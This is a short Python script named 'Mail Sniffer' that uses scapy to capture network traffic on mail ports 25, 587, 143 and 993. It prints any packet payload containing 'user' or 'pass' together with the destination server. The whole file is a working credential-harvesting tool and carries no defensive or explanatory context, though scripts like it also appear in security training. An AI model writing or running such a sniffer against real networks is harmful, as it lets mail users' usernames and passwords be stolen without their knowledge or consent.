#!/usr/bin/env python
"""Mail Sniffer."""
from scapy.all import *

# our packet callback


def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print(f"[*] Server: {packet[IP].dst}")
            print(f"[*] Payload: {packet[TCP].payload}")
    # print(packet.show())


if __name__ == "__main__":
    sniff(
        filter="tcp port 587 or tcp port 25 or tcp port 143 or tcp port 993",
        prn=packet_callback,
        store=0,
    )
